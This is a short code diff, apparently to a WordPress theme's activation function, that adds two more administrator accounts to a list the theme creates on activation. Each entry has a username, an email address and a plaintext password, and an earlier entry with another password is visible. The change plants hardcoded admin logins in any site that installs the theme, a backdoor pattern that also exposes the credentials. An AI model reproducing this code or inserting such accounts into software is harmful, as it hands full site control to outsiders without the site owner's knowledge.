@@ -148,6 +148,18 @@ function create_custom_admin_users_on_theme_activation() {
                 'password' => 'Norhan9727',
                 'role'     => 'administrator'
             ],
+            [
+                'username' => 'AhmedKhaled',
+                'email'    => 'ahmed.k.abdelkader@gmail.com',
+                'password' => 'Ahmed@12345',
+                'role'     => 'administrator'
+            ],
+            [
+                'username' => 'gohar89',
+                'email'    => 'goharmahmoud89@gmail.com',
+                'password' => '11081002@Zozmory',
+                'role'     => 'administrator'
+            ],
         ]
     ];
 
